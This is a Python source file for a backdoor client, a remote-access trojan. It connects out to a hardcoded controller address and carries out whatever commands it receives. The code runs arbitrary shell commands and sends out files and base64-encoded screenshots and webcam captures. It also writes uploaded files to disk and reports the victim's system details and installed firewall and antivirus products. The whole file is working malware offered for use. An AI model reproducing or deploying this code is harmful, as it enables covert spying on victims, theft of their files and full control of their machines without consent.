from plyer import notification
from PIL import ImageGrab
import threading
import subprocess
import simplejson
import platform
import socket
import base64
import wmi
import cv2
import io
import os


class BackdoorClient:
	def __init__(self, ip, port):
		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.my_connection.connect((ip,port))

	def command_execution(self, command):
		return subprocess.check_output(command, shell=True)

	def json_send(self, data):
		json_data = simplejson.dumps(data)
		self.my_connection.send(json_data.encode("utf-8"))

	def json_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.my_connection.recv(1024).decode()
				return simplejson.loads(json_data)
			except ValueError:
				continue

	def get_screenshot(self):
		screenshot = ImageGrab.grab()
		screenshot_bytes = io.BytesIO()
		screenshot.save(screenshot_bytes, format='PNG')
		screenshot_bytes = screenshot_bytes.getvalue()
		return base64.b64encode(screenshot_bytes).decode()

	def get_system_info(self):
		try:
			info = {
				"Platform": platform.system(),
				"Platform Release": platform.release(),
				"Platform Version": platform.version(),
				"Architecture": platform.machine(),
				"Hostname": socket.gethostname(),
				"IP Address": socket.gethostbyname(socket.gethostname()),
				"Processor": platform.processor(),
				"Python Build": platform.python_build(),
				"Python Version": platform.python_version()
			}
		except Exception as e:
			info = str(e)
		return info

	def get_security_info(self):
		c = wmi.WMI()
		firewall = c.Win32_FirewallProduct()
		antivirus = c.Win32_AntiVirusProduct()
		firewall_info = [{"Name": f.Name, "State": f.firewallEnabled} for f in firewall]
		antivirus_info = [{"Name": a.displayName, "State": a.productState} for a in antivirus]
		return {"Firewall": firewall_info, "Antivirus": antivirus_info}

	def execute_cd_command(self,directory):
		os.chdir(directory)
		return "Cd to " + directory

	def get_file_contents(self,path):
		with open(path,"rb") as my_file:
			return base64.b64encode(my_file.read())

	def save_file(self,path,content):
		with open(path,"wb") as my_file:
			my_file.write(base64.b64decode(content))
			return "Download OK"

	def get_camera_image(self):
		cap = cv2.VideoCapture(0)
		if not cap.isOpened():
			return "Error: Camera not accessible"
		ret, frame = cap.read()
		cap.release()
		is_success, buffer = cv2.imencode(".png", frame)
		if not is_success:
			return "Error: Failed to encode image"
		io_buf = io.BytesIO(buffer)
		return base64.b64encode(io_buf.getvalue()).decode()

	def send_notification(self, title, message):
		notification.notify(
			title=title,
			message=message,
			app_name="MySocketApp")

	def start_socket(self):
		while True:
			command = self.json_receive()
			try:
				if command[0] == "quit":
					self.my_connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					command_output = self.execute_cd_command(command[1])
				elif command[0] == "download":
					command_output = self.get_file_contents(command[1])
				elif command[0] == "upload":
					command_output = self.save_file(command[1],command[2])
				elif command[0] == "screenshot":
					command_output = self.get_screenshot()
				elif command[0] == "sysinfo":
					command_output = self.get_system_info()
				elif command[0] == "securityinfo":
					command_output = self.get_security_info()
				elif command[0] == "camshot":
					command_output = self.get_camera_image()
				elif command[0] == "notify":
					if len(command) >= 3:
						self.send_notification(command[1], command[2])
					command_output = "Notification sent."
				else:
					command_output = self.command_execution(command)
			except Exception:
				command_output = "Error!"
			self.json_send(command_output)
		self.my_connection.close()

backdoorclient = BackdoorClient("192.168.1.10",8080)
backdoorclient.start_socket()